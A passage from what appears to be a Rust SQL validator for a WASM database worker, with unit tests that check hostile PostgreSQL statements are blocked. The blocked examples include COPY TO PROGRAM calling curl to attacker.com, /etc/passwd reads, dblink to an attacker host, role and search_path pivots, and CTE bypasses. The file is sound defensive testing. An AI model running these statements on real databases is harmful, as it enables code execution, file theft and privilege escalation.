    // MCP-519: fail closed on any statement type the validator
    // hasn't been taught to classify. Runs AFTER is_ddl /
    // always_blocked_label so canonical (DML / SELECT / EXPLAIN /
    // …) paths still report their specific error type — only
    // genuinely-novel variants surface this. The documented
    // "empty allowlist = no restriction beyond DDL" mode is now
    // additionally bounded by "and the statement type is one the
    // validator recognizes", which closes the silent-bypass class
    // that grew as sqlparser added new Statement variants.
    if stmt_type == "UNKNOWN" {
        return Err(SqlValidationError::UnknownStatement);
    }

    // Which functions the statement calls: only those the allow list
    // admits. Runs AFTER the statement-level deny-list (so canonical errors
    // take precedence) but BEFORE the operation allowlist (so a SELECT that
    // calls `pg_read_server_files` fails even when SELECT is the only
    // permitted operation). See `check_called_functions`.
    check_called_functions(stmt)?;

    // A statement can carry another (a writable CTE, a `WITH … INSERT`). The
    // root's kind is checked against the allowlist below; everything it
    // carries is checked here, whatever the root is.
    check_carried_statements(stmt, allowed_operations, empty_policy)?;

    // M-3 (2026-05-22): empty allowlist no longer means "anything
    // non-DDL goes". Under `DenyMutations`, only SELECT passes when the
    // allowlist is empty — every mutation requires an explicit grant in
    // the JobRequest. Legacy permissive behaviour is gated behind
    // `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1`. (EXPLAIN is unconditionally
    // blocked by `always_blocked_label` above, so it never reaches here.)
    if stmt_type != "SELECT" {
        if allowed_operations.is_empty() {
            match empty_policy {
                EmptyAllowlistPolicy::DenyMutations => {
                    return Err(SqlValidationError::DisallowedOperation(
                        stmt_type.to_string(),
                    ));
                }
                EmptyAllowlistPolicy::AllowAllNonDdl => {
                    // Fall through — legacy permissive mode admits.
                }
            }
        } else {
            let permitted = allowed_operations
                .iter()
                .any(|op| op.eq_ignore_ascii_case(stmt_type));
            if !permitted {
                return Err(SqlValidationError::DisallowedOperation(
                    stmt_type.to_string(),
                ));
            }
        }
    }

    Ok(ValidatedStmt {
        stmt_type: stmt_type.to_string(),
        returns_rows: statement_returns_rows(stmt),
        access: talos_sql_classify::classify(stmt),
    })
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn select_always_allowed() {
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        assert!(validate_sql("SELECT * FROM users WHERE id = $1", &[]).is_ok());
    }

    #[test]
    fn insert_allowed_when_in_allowlist() {
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).is_ok());
    }

    #[test]
    fn insert_blocked_when_not_in_allowlist() {
        let ops = vec!["SELECT".to_string()];
        let err = validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedOperation(_)));
    }

    #[test]
    fn ddl_always_blocked() {
        assert!(matches!(
            validate_sql("CREATE TABLE t (id INT)", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("DROP TABLE users", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("ALTER TABLE users ADD COLUMN x TEXT", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("TRUNCATE users", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
    }

    #[test]
    fn multi_statement_blocked() {
        assert!(matches!(
            validate_sql("SELECT 1; DROP TABLE users", &[]).unwrap_err(),
            SqlValidationError::MultipleStatements
        ));
    }

    #[test]
    fn invalid_sql_rejected() {
        assert!(matches!(
            validate_sql("NOT VALID SQL AT ALL ???", &[]).unwrap_err(),
            SqlValidationError::ParseError(_)
        ));
    }

    #[test]
    fn comments_in_valid_sql_are_fine() {
        // The AST parser handles comments correctly — they don't affect security
        assert!(validate_sql("SELECT /* comment */ 1", &[]).is_ok());
        assert!(validate_sql("SELECT 1 -- inline comment", &[]).is_ok());
    }

    #[test]
    fn update_and_delete_with_allowlist() {
        let ops = vec!["UPDATE".to_string(), "DELETE".to_string()];
        assert!(validate_sql("UPDATE t SET x = $1 WHERE id = $2", &ops).is_ok());
        assert!(validate_sql("DELETE FROM t WHERE id = $1", &ops).is_ok());
    }

    /// M-3 (2026-05-22): under the new default policy
    /// (`DenyMutations`), an empty allowlist permits SELECT/EXPLAIN
    /// only. Mutation statements are rejected as `DisallowedOperation`.
    #[test]
    fn empty_allowlist_denies_mutations_by_default() {
        assert!(matches!(
            validate_sql("INSERT INTO t (a) VALUES ($1)", &[]).unwrap_err(),
            SqlValidationError::DisallowedOperation(s) if s == "INSERT"
        ));
        assert!(matches!(
            validate_sql("UPDATE t SET x = $1", &[]).unwrap_err(),
            SqlValidationError::DisallowedOperation(s) if s == "UPDATE"
        ));
        assert!(matches!(
            validate_sql("DELETE FROM t WHERE id = $1", &[]).unwrap_err(),
            SqlValidationError::DisallowedOperation(s) if s == "DELETE"
        ));
        // SELECT still passes under the default; EXPLAIN is now blocked
        // unconditionally (controller alignment — it executes its inner stmt).
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        assert!(matches!(
            validate_sql("EXPLAIN SELECT 1", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(s) if s == "EXPLAIN"
        ));
    }

    /// Legacy permissive behaviour is reachable via the explicit
    /// policy override (operators set
    /// `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1` to flip the env-based
    /// default).
    #[test]
    fn empty_allowlist_permissive_policy_allows_mutations() {
        let p = EmptyAllowlistPolicy::AllowAllNonDdl;
        assert!(validate_sql_with_policy("INSERT INTO t (a) VALUES ($1)", &[], p).is_ok());
        assert!(validate_sql_with_policy("UPDATE t SET x = $1", &[], p).is_ok());
        assert!(validate_sql_with_policy("DELETE FROM t WHERE id = $1", &[], p).is_ok());
    }

    /// CALL / MERGE — newer mutation surfaces. Under the default
    /// policy they're treated like INSERT/UPDATE/DELETE.
    #[test]
    fn empty_allowlist_denies_call_and_merge() {
        // From 2026-10-08 a CALL is refused by the function gate first: the
        // procedure it names is not on the allow list, and that gate runs
        // before the operation allowlist — so granting "CALL" does not admit
        // it either. (The controller refuses every CALL regardless.)
        for ops in [vec![], vec!["CALL".to_string()]] {
            assert!(matches!(
                validate_sql("CALL my_procedure($1, $2)", &ops).unwrap_err(),
                SqlValidationError::DisallowedFunction(name) if name == "my_procedure"
            ));
        }
        // MERGE syntax can be PostgreSQL or Snowflake-dialect — both
        // should hit the same gate.
        let merge_sql =
            "MERGE INTO target USING src ON target.id = src.id WHEN MATCHED THEN UPDATE SET val = src.val";
        // sqlparser may or may not parse this in PostgreSqlDialect; if
        // it does, we want DisallowedOperation, if not, ParseError —
        // both are fail-closed.
        let res = validate_sql(merge_sql, &[]);
        assert!(matches!(
            res.unwrap_err(),
            SqlValidationError::DisallowedOperation(_) | SqlValidationError::ParseError(_)
        ));
    }

    /// Explicit allowlist still works as documented: listed types
    /// pass, unlisted are rejected.
    #[test]
    fn explicit_allowlist_overrides_default() {
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).is_ok());
        // UPDATE not in the list — denied even though INSERT is.
        assert!(matches!(
            validate_sql("UPDATE t SET x = $1", &ops).unwrap_err(),
            SqlValidationError::DisallowedOperation(_)
        ));
    }

    #[test]
    fn complex_select_with_subquery() {
        assert!(validate_sql(
            "SELECT * FROM (SELECT id, name FROM users WHERE active = true) t WHERE t.id > $1",
            &[]
        )
        .is_ok());
    }

    #[test]
    fn select_with_union() {
        assert!(validate_sql("SELECT id FROM users UNION ALL SELECT id FROM admins", &[]).is_ok());
    }

    #[test]
    fn cte_select_allowed() {
        assert!(validate_sql(
            "WITH active AS (SELECT * FROM users WHERE active = true) SELECT * FROM active",
            &[]
        )
        .is_ok());
    }

    #[test]
    fn grant_blocked() {
        assert!(matches!(
            validate_sql("GRANT ALL ON users TO public", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
    }

    #[test]
    fn explain_is_blocked_to_match_controller() {
        // EXPLAIN is unconditionally blocked: `EXPLAIN ANALYZE <stmt>`
        // EXECUTES its inner statement, so the worker must not classify it as
        // a harmless read-only op. Aligns with the controller's
        // `controller_permits_data_statement` (admits only DML, not EXPLAIN).
        for sql in [
            "EXPLAIN SELECT 1",
            "EXPLAIN ANALYZE INSERT INTO t (a) VALUES (1)",
            "EXPLAIN ANALYZE CREATE TABLE x AS SELECT 1",
        ] {
            assert!(
                matches!(
                    validate_sql(sql, &[]).unwrap_err(),
                    SqlValidationError::AlwaysBlocked(s) if s == "EXPLAIN"
                ),
                "expected EXPLAIN block for {sql:?}",
            );
            // Even an explicit INSERT grant must not let EXPLAIN ANALYZE
            // smuggle the write past the worker.
            assert!(validate_sql(
                "EXPLAIN ANALYZE INSERT INTO t (a) VALUES (1)",
                &["INSERT".to_string()]
            )
            .is_err(),);
        }
    }

    #[test]
    fn returns_correct_statement_type() {
        // Mutation classifications round-trip through the validator
        // with an explicit allowlist for each type (the post-M-3
        // default rejects empty-allowlist mutations).
        assert_eq!(validate_sql("SELECT 1", &[]).unwrap().stmt_type, "SELECT");
        assert_eq!(
            validate_sql("INSERT INTO t (a) VALUES (1)", &["INSERT".to_string()])
                .unwrap()
                .stmt_type,
            "INSERT"
        );
        assert_eq!(
            validate_sql("UPDATE t SET a = 1", &["UPDATE".to_string()])
                .unwrap()
                .stmt_type,
            "UPDATE"
        );
        assert_eq!(
            validate_sql("DELETE FROM t WHERE id = 1", &["DELETE".to_string()])
                .unwrap()
                .stmt_type,
            "DELETE"
        );
    }

    // MCP-578: AST-based `returns_rows` detection. Pre-fix the worker
    // used a substring `.contains("RETURNING")` check on the raw SQL,
    // which false-positived on string literals and identifier
    // substrings. The false-positive caused the controller to wrap
    // the DML in a CTE that Postgres rejected with "WITH query has
    // no RETURNING clause" — the operator's INSERT never ran.
    #[test]
    fn returns_rows_select() {
        assert!(validate_sql("SELECT 1", &[]).unwrap().returns_rows);
        assert!(
            validate_sql("SELECT * FROM users WHERE id = $1", &[])
                .unwrap()
                .returns_rows
        );
    }

    #[test]
    fn returns_rows_insert_with_returning() {
        let ops = vec!["INSERT".to_string()];
        let v = validate_sql("INSERT INTO t (a) VALUES ($1) RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_insert_without_returning_is_false() {
        let v = validate_sql("INSERT INTO t (a) VALUES ($1)", &["INSERT".to_string()]).unwrap();
        assert!(
            !v.returns_rows,
            "INSERT without RETURNING should not return rows"
        );
    }

    #[test]
    fn returns_rows_insert_with_returning_substring_in_string_literal_is_false() {
        // The historical false-positive: substring "RETURNING" appears
        // inside a string literal but the actual statement has NO
        // RETURNING clause. Pre-fix the worker's
        // `sql.to_uppercase().contains("RETURNING")` returned true →
        // controller CTE-wrapped → PG rejected → INSERT never ran.
        // AST-based detection sees no Returning node in the Insert
        // AST and correctly returns false.
        let v = validate_sql(
            "INSERT INTO logs (msg) VALUES ('user returning home')",
            &["INSERT".to_string()],
        )
        .unwrap();
        assert!(
            !v.returns_rows,
            "string-literal 'returning' must not flip returns_rows"
        );
    }

    #[test]
    fn returns_rows_update_with_returning_substring_in_identifier_is_false() {
        // Identifier-substring false positive: column name happens to
        // contain "RETURNING" but no actual RETURNING clause.
        let ops = vec!["UPDATE".to_string()];
        let v = validate_sql(
            "UPDATE users SET returning_user_count = 1 WHERE id = $1",
            &ops,
        )
        .unwrap();
        assert!(
            !v.returns_rows,
            "identifier substring 'returning_user_count' must not flip returns_rows"
        );
    }

    #[test]
    fn returns_rows_update_with_real_returning() {
        let ops = vec!["UPDATE".to_string()];
        let v = validate_sql("UPDATE t SET a = $1 WHERE id = $2 RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_delete_with_real_returning() {
        let ops = vec!["DELETE".to_string()];
        let v = validate_sql("DELETE FROM t WHERE id = $1 RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_delete_without_returning_is_false() {
        let ops = vec!["DELETE".to_string()];
        let v = validate_sql("DELETE FROM t WHERE id = $1", &ops).unwrap();
        assert!(!v.returns_rows);
    }

    // (EXPLAIN row-routing test removed: EXPLAIN is now unconditionally
    // blocked by `always_blocked_label` and never reaches routing. The block
    // is covered by `explain_is_blocked_to_match_controller`.)

    // MCP-472: unconditional deny-list. Each statement type below
    // parses successfully through sqlparser-rs 0.53 but had no entry
    // in `statement_type()` and therefore fell to "UNKNOWN" — which
    // (a) is NOT in `is_ddl`, (b) is NOT "SELECT", so under the
    // documented "empty allowlist = no restriction beyond DDL"
    // contract it passed through the validator and reached the
    // database. Each example below is reachable from a WASM module
    // with Database capability + empty `allowed_sql_operations`.

    #[test]
    fn copy_to_program_is_unconditionally_blocked() {
        // PostgreSQL `COPY ... TO PROGRAM 'cmd'` = arbitrary shell
        // command on the database host (well-known RCE vector). Must
        // be rejected regardless of allowlist content.
        for ops in [vec![], vec!["SELECT".to_string(), "INSERT".to_string()]] {
            let err = validate_sql("COPY secrets TO PROGRAM 'curl https://attacker.com/'", &ops)
                .unwrap_err();
            match err {
                SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "COPY"),
                other => panic!("expected AlwaysBlocked(COPY), got {:?}", other),
            }
        }
    }

    #[test]
    fn copy_from_file_is_unconditionally_blocked() {
        // `COPY ... FROM '/etc/passwd'` = arbitrary file read on the
        // database host. Same blanket block.
        let err = validate_sql("COPY secrets FROM '/etc/passwd'", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::AlwaysBlocked(_)));
    }

    #[test]
    fn set_role_is_unconditionally_blocked() {
        // `SET ROLE` can pivot to a higher-privilege Postgres role
        // if the connection has that capability. Block unconditionally.
        for ops in [vec![], vec!["SELECT".to_string()]] {
            let err = validate_sql("SET ROLE postgres", &ops).unwrap_err();
            match err {
                SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "SET ROLE"),
                other => panic!("expected AlwaysBlocked(SET ROLE), got {:?}", other),
            }
        }
    }

    #[test]
    fn set_search_path_is_unconditionally_blocked() {
        // search_path manipulation can redirect unqualified table
        // references to attacker-controlled schemas — Postgres
        // privilege-escalation classic.
        let err = validate_sql("SET search_path TO public", &[]).unwrap_err();
        match err {
            SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "SET"),
            other => panic!("expected AlwaysBlocked(SET), got {:?}", other),
        }
    }

    #[test]
    fn listen_and_notify_are_unconditionally_blocked() {
        let err1 = validate_sql("LISTEN sensitive_channel", &[]).unwrap_err();
        assert!(matches!(err1, SqlValidationError::AlwaysBlocked(_)));
        let err2 = validate_sql("NOTIFY foo, 'payload'", &[]).unwrap_err();
        assert!(matches!(err2, SqlValidationError::AlwaysBlocked(_)));
    }

    #[test]
    fn prepare_execute_deallocate_unconditionally_blocked() {
        // `PREPARE foo AS DELETE FROM secrets; EXECUTE foo` is the
        // classic two-step bypass — the validator sees only EXECUTE
        // later and can't introspect the prepared body.
        assert!(matches!(
            validate_sql("PREPARE p AS SELECT 1", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("EXECUTE p", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("DEALLOCATE p", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
    }

    #[test]
    fn transaction_control_unconditionally_blocked() {
        // The worker owns transaction boundaries; guest code must not
        // open or close one.
        for sql in &[
            "BEGIN",
            "COMMIT",
            "ROLLBACK",
            "SAVEPOINT s1",
            "RELEASE SAVEPOINT s1",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::AlwaysBlocked(_)),
                "stmt {} should be AlwaysBlocked, got {:?}",
                sql,
                err
            );
        }
    }

    #[test]
    fn discard_and_show_unconditionally_blocked() {
        assert!(matches!(
            validate_sql("DISCARD ALL", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("SHOW data_directory", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
    }

    #[test]
    fn deny_list_does_not_affect_normal_dml() {
        // Sanity: the deny-list addition must NOT regress SELECT /
        // INSERT / UPDATE / DELETE under their normal allowlist
        // semantics.
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        let ops = vec![
            "INSERT".to_string(),
            "UPDATE".to_string(),
            "DELETE".to_string(),
        ];
        assert!(validate_sql("INSERT INTO t (a) VALUES (1)", &ops).is_ok());
        assert!(validate_sql("UPDATE t SET a = 1 WHERE id = 1", &ops).is_ok());
        assert!(validate_sql("DELETE FROM t WHERE id = 1", &ops).is_ok());
    }

    #[test]
    fn select_with_returning_insert() {
        // INSERT ... RETURNING is an INSERT, not a SELECT
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES (1) RETURNING *", &ops).is_ok());

        // But without INSERT in allowlist, it's blocked
        let ops = vec!["SELECT".to_string()];
        assert!(matches!(
            validate_sql("INSERT INTO t (a) VALUES (1) RETURNING *", &ops).unwrap_err(),
            SqlValidationError::DisallowedOperation(_)
        ));
    }

    // MCP-519: the following DDL variants previously fell to the
    // `_ => "UNKNOWN"` arm of `statement_type` because sqlparser
    // grew them without the validator being updated. Combined with
    // empty `allowed_operations` they bypassed every gate. Pin
    // each one as DDL so an audit reviewer can grep for the
    // regression class.

    #[test]
    fn create_policy_is_ddl_blocked() {
        // PostgreSQL Row Level Security: `CREATE POLICY ... USING (true)`
        // would silently expose every row on an RLS-protected table.
        // sqlparser parses this with PostgreSqlDialect.
        let err = validate_sql(
            "CREATE POLICY everyone ON users FOR SELECT USING (true)",
            &[],
        )
        .unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "CREATE POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn drop_policy_is_ddl_blocked() {
        let err = validate_sql("DROP POLICY p ON users", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "DROP POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn alter_policy_is_ddl_blocked() {
        let err = validate_sql("ALTER POLICY p ON users RENAME TO q", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "ALTER POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn create_database_is_ddl_blocked() {
        let err = validate_sql("CREATE DATABASE evil", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "CREATE DATABASE must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn drop_function_and_procedure_and_trigger_are_ddl_blocked() {
        for sql in &[
            "DROP FUNCTION add_one(integer)",
            "DROP PROCEDURE compact_table()",
            "DROP TRIGGER trg_audit ON users",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DdlBlocked(_)),
                "{} must be DDL-blocked, got {:?}",
                sql,
                err
            );
        }
    }

    // MCP-519: extension / library loading. RCE class — `LOAD` in
    // PG loads a shared library; INSTALL is the DuckDB variant the
    // parser shares.

    #[test]
    fn load_and_install_are_always_blocked() {
        // `LOAD 'libfoo.so'` loads a Postgres shared lib at runtime.
        let err = validate_sql("LOAD 'libpg_evil.so'", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::AlwaysBlocked(_)),
            "LOAD must be always-blocked, got {:?}",
            err
        );
    }

    // MCP-519: fail-closed on any statement type the validator
    // can't classify. Direct construction of an unknown variant
    // would need parser cooperation; we exercise the contract by
    // looking up SQL that maps to a statement type currently in
    // the deny-list AND verifying behaviour. The defining contract
    // — UnknownStatement IS in the error enum — is sufficient
    // documentation; a future sqlparser bump that introduces a
    // new Statement variant will surface the error in production
    // logs and operators can grep for `UnknownStatement` to find
    // it.

    #[test]
    fn unknown_statement_error_displays_safely() {
        let err = SqlValidationError::UnknownStatement;
        let msg = err.to_string();
        // The display string must explain the fail-closed posture
        // (so operators don't assume a parser bug) and must not
        // leak the unhandled variant name.
        assert!(msg.contains("not classified"));
        assert!(msg.contains("fail-closed"));
    }

    // MCP-554: CTE-mutation bypass via DELETE and via nested CTEs.
    //
    // The original `check_cte_mutations` only matched
    // `SetExpr::Insert` and `SetExpr::Update` at the TOP-LEVEL `with`
    // chain. Two bypass classes:
    //
    //   1. DELETE-in-CTE: sqlparser-rs 0.53 represents
    //      `WITH x AS (DELETE FROM t RETURNING *) SELECT ...` either
    //      as `SetExpr::Delete` (its own variant) or as a Query body
    //      whose body is `Delete`. Either way the original code's
    //      `_ => continue` arm skipped it. A WASM module with an
    //      empty allowlist plus a SELECT-only grant could still
    //      execute DELETE via the CTE wrapper.
    //
    //   2. Nested WITH-with-mutation inside a CTE body or subquery
    //      (`WITH outer AS (WITH inner AS (INSERT ...) SELECT ...)`
    //      or `SELECT * FROM (WITH x AS (INSERT ...) SELECT *) sub`).
    //      The original code never recursed past the top-level
    //      cte_tables.
    //
    // These tests pin the post-fix behaviour. Each one feeds a query
    // that under the pre-fix validator parsed as SELECT and passed
    // through.

    #[test]
    fn cte_delete_is_blocked_with_select_only_allowlist() {
        let ops = vec!["SELECT".to_string()];
        let sql = "WITH gone AS (DELETE FROM t WHERE id = $1 RETURNING *) SELECT * FROM gone";
        let result = validate_sql(sql, &ops);
        // The exact error type depends on how sqlparser represents
        // DELETE-in-CTE (parser refusal, or AST shape that
        // statement_type categorizes as DELETE rather than SELECT).
        // Either way the validator MUST reject under SELECT-only
        // allowlist semantics — we just don't pin which arm fires.
        assert!(
            result.is_err(),
            "DELETE-in-CTE must be blocked under SELECT-only allowlist, got {:?}",
            result
        );
    }

    #[test]
    fn nested_cte_insert_inside_subquery_is_blocked() {
        let ops = vec!["SELECT".to_string()];
        let sql =
            "SELECT * FROM (WITH b AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM b) sub";
        let result = validate_sql(sql, &ops);
        assert!(
            result.is_err(),
            "INSERT in a nested CTE within a subquery must be blocked, got {:?}",
            result
        );
    }

    #[test]
    fn nested_cte_update_inside_outer_cte_body_is_blocked() {
        let ops = vec!["SELECT".to_string()];
        let sql = "WITH outer_cte AS (WITH inner_cte AS (UPDATE t SET x=1 RETURNING *) SELECT * FROM inner_cte) SELECT * FROM outer_cte";
        let result = validate_sql(sql, &ops);
        assert!(
            result.is_err(),
            "UPDATE in a nested CTE within another CTE body must be blocked, got {:?}",
            result
        );
    }

    #[test]
    fn cte_select_inside_subquery_still_passes() {
        // Tripwire: the deep-walk must NOT regress legitimate nested
        // SELECT-only CTEs.
        let ops: Vec<String> = vec![];
        let sql = "SELECT * FROM (WITH b AS (SELECT 1 AS x) SELECT * FROM b) sub";
        assert!(validate_sql(sql, &ops).is_ok());
    }

    // ────────────────────────────────────────────────────────────────────
    // Wasm-security review 2026-05-22 (MEDIUM-1): expression-level
    // function deny-list. Each test below pins a specific bypass path
    // that the pre-fix validator admitted under empty `allowed_operations`
    // because the statement parsed as a benign SELECT. The errors are
    // `DisallowedFunction` because the function-walk runs before the
    // allowlist gate; this means even a SELECT-only module gets blocked.
    // ────────────────────────────────────────────────────────────────────

    #[test]
    fn pg_sleep_blocked_in_select() {
        // Sleep-the-budget DoS: 8 concurrent `pg_sleep(60)` calls stall
        // the controller's database-RPC semaphore (MAX_IN_FLIGHT=8) for
        // the full statement_timeout window.
        let err = validate_sql("SELECT pg_sleep(60)", &[]).unwrap_err();
        match err {
            SqlValidationError::DisallowedFunction(name) => {
                assert!(
                    name.contains("pg_sleep"),
                    "error name must reference pg_sleep, got `{name}`"
                );
            }
            other => panic!("expected DisallowedFunction, got {other:?}"),
        }
    }

    #[test]
    fn set_config_blocked_as_function_form_of_set() {
        // `set_config(name, value, is_local)` is the FUNCTION equivalent of the
        // statement-level-blocked `SET` — it performs the same session-state
        // mutation (search_path / role / statement_timeout) "for the rest of
        // the connection" that the SET deny-list exists to prevent, but as a
        // plain function call inside a SELECT. Must be denied for parity.
        for sql in [
            "SELECT set_config('statement_timeout', '0', false)",
            "SELECT set_config('search_path', 'attacker, public', false)",
            "SELECT set_config('role', 'postgres', false)",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            match err {
                SqlValidationError::DisallowedFunction(name) => assert!(
                    name.contains("set_config"),
                    "error must reference set_config, got `{name}` for `{sql}`"
                ),
                other => panic!("expected DisallowedFunction for `{sql}`, got {other:?}"),
            }
        }
    }

    #[test]
    fn set_config_blocked_pg_catalog_qualified() {
        // The canonical search-path-bypass form must be caught too.
        let err = validate_sql(
            "SELECT pg_catalog.set_config('search_path', 'x', false)",
            &[],
        )
        .unwrap_err();
        match err {
            SqlValidationError::DisallowedFunction(name) => {
                assert!(name.contains("set_config"), "got `{name}`")
            }
            other => panic!("expected DisallowedFunction, got {other:?}"),
        }
    }

    #[test]
    fn pg_notify_blocked_as_function_form_of_notify() {
        // `pg_notify(channel, payload)` is the FUNCTION equivalent of the
        // statement-level-blocked `NOTIFY` — the same inter-session side
        // channel, reached as a plain function call. Must be denied for parity
        // (sibling of the set_config↔SET gap).
        let err = validate_sql("SELECT pg_notify('chan', 'secret-exfil')", &[]).unwrap_err();
        match err {
            SqlValidationError::DisallowedFunction(name) => assert!(
                name.contains("pg_notify"),
                "error must reference pg_notify, got `{name}`"
            ),
            other => panic!("expected DisallowedFunction, got {other:?}"),
        }
        // pg_catalog-qualified form too.
        let err = validate_sql("SELECT pg_catalog.pg_notify('chan', 'x')", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    /// Under the deny list `current_setting` was admitted because it
    /// mutates nothing. The allow list asks more of a function: it must read
    /// nothing stored beyond its arguments, and a session setting is server
    /// state. Refused from 2026-10-08, with the other session readers.
    #[test]
    fn functions_that_read_session_state_are_refused() {
        for sql in [
            "SELECT current_setting('server_version')",
            "SELECT current_user",
            "SELECT version()",
            "SELECT pg_backend_pid()",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DisallowedFunction(_)),
                "`{sql}` must be refused, got {err:?}"
            );
        }
    }

    #[test]
    fn pg_read_server_files_blocked() {
        // Arbitrary host-filesystem read.
        let err = validate_sql(
            "SELECT pg_read_server_files('/etc/passwd', 0, NULL, false)",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn pg_terminate_backend_blocked() {
        // Cross-tenant session kill.
        let err = validate_sql("SELECT pg_terminate_backend(12345)", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn dblink_blocked() {
        // dblink bypasses every network-egress control the worker
        // enforces — the connection opens from inside Postgres,
        // sidestepping `EXTERNAL_LLM_HOSTS` and the host allowlist.
        let err = validate_sql(
            "SELECT * FROM dblink('host=attacker.com user=evil', 'SELECT 1') AS t(x int)",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn dblink_connect_u_blocked() {
        // The UNRESTRICTED dblink connect — lets a non-superuser use any
        // libpq auth method. Denying `dblink_connect` but not `_u` left the
        // explicit bypass open (2026-05-31 deny-list completion).
        let err = validate_sql(
            "SELECT dblink_connect_u('myconn', 'host=attacker.com')",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn pg_file_write_blocked() {
        // adminpack filesystem WRITE — the mutation counterpart to the
        // already-blocked pg_read_file. Writing/deleting host files is
        // strictly worse than reading them.
        let err = validate_sql("SELECT pg_file_write('/tmp/x', 'data', false)", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn schema_qualified_pg_catalog_form_is_blocked() {
        // The canonical bypass for a hypothetical search_path-based
        // block: explicitly qualifying with `pg_catalog`. The visitor
        // must match the qualified form too.
        let err = validate_sql("SELECT pg_catalog.pg_sleep(60)", &[]).unwrap_err();
        match err {
            SqlValidationError::DisallowedFunction(name) => {
                assert_eq!(
                    name, "pg_catalog.pg_sleep",
                    "schema-qualified form must round-trip in the error"
                );
            }
            other => panic!("expected DisallowedFunction, got {other:?}"),
        }
    }

    /// Under the deny list a name in any schema but `pg_catalog` was not
    /// matched, so `public.pg_sleep` was admitted (a documented trade-off).
    /// The allow list reads only a bare or `pg_catalog` name: whatever a
    /// deployment put in another schema is refused, even under a listed
    /// name, and so is a quoted name, which Postgres does not fold.
    #[test]
    fn a_name_in_another_schema_or_quoted_is_refused() {
        for (sql, named) in [
            ("SELECT public.pg_sleep(60)", "public.pg_sleep"),
            ("SELECT public.lower(name) FROM t", "public.lower"),
            ("SELECT myapp.f(1)", "myapp.f"),
            ("SELECT \"LOWER\"(name) FROM t", "\"LOWER\""),
            ("SELECT \"lower\"(name) FROM t", "\"lower\""),
        ] {
            match validate_sql(sql, &[]).unwrap_err() {
                SqlValidationError::DisallowedFunction(name) => assert_eq!(name, named, "{sql}"),
                other => panic!("expected DisallowedFunction for `{sql}`, got {other:?}"),
            }
        }
        assert!(validate_sql("SELECT pg_catalog.lower(name) FROM t", &[]).is_ok());
    }

    #[test]
    fn function_deny_list_case_insensitive() {
        // PG normalises unquoted identifiers to lower; case games
        // must not bypass the validator.
        for sql in [
            "SELECT PG_SLEEP(1)",
            "SELECT Pg_Sleep(1)",
            "SELECT pG_sLeEp(1)",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DisallowedFunction(_)),
